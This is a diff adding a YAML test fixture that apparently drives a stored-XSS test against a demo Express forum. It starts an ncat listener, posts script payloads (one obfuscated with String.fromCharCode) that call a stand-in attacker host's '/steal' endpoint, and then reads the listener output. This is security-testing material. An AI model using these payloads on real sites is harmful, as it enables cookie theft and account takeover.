@@ -1,0 +1,70 @@
+# Fixture: mixed_xss
+# Tests: exec_attacker (listener), browser session (inject XSS), sleep, exec_attacker (read result)
+# Attack: browser injects stored XSS in forum post, then reads exfiltrated cookie from listener
+# Target: simple_express app with /forum/posts and /forum/:id endpoints
+sessions:
+  - id: attacker_browser
+    type: browser
+    base_url: "http://${target_host}:${target_port}"
+
+procedure:
+  # 1. Start out-of-band listener
+  - step_id: start_listener
+    action:
+      type: exec_attacker
+      command: "pkill -f 'ncat.*9997' 2>/dev/null; rm -f /tmp/goe_listen_9997.txt; ncat -lk 9997 > /tmp/goe_listen_9997.txt 2>/dev/null &"
+    expect:
+      exit_code: 0
+    timeout: 5
+
+  # 2. Inject stored XSS payload via HTTP (simpler than browser form for this test)
+  - step_id: inject_xss
+    action:
+      type: http_request
+      method: POST
+      url: "http://${target_host}:${target_port}/forum/posts"
+      headers:
+        Content-Type: application/json
+      body: '{"content": "<img src=x onerror=\"fetch(String.fromCharCode(104,116,116,112,58,47,47)+String.fromCharCode(36,116,97,114,103,101,116,95,104,111,115,116))\">NOSCRIPT"}'
+    expect:
+      status: 201
+    timeout: 10
+
+  # Simpler XSS: use direct JS fetch to attacker
+  - step_id: inject_real_xss
+    action:
+      type: http_request
+      method: POST
+      url: "http://${target_host}:${target_port}/forum/posts"
+      headers:
+        Content-Type: application/json
+      body: "{\"content\": \"<script>fetch('http://${attacker_host}:9997/steal?c=xss_fired')</script>\"}"
+    expect:
+      status: 201
+    outputs:
+      post_id: json(".id")
+    timeout: 10
+
+  # 3. Browser visits the post — triggers XSS
+  - step_id: view_xss_post
+    session: attacker_browser
+    action:
+      type: navigate
+      path: "/forum/${steps.inject_real_xss.post_id}"
+    expect: null
+    timeout: 10
+
+  # 4. Wait for XSS to fire
+  - step_id: wait_for_xss
+    action:
+      type: sleep
+      seconds: 2
+
+  # 5. Read exfiltrated data
+  - step_id: read_stolen_data
+    action:
+      type: exec_attacker
+      command: "cat /tmp/goe_listen_9997.txt 2>/dev/null || echo 'nothing'"
+    expect:
+      stdout_contains: "xss_fired"
+    timeout: 10
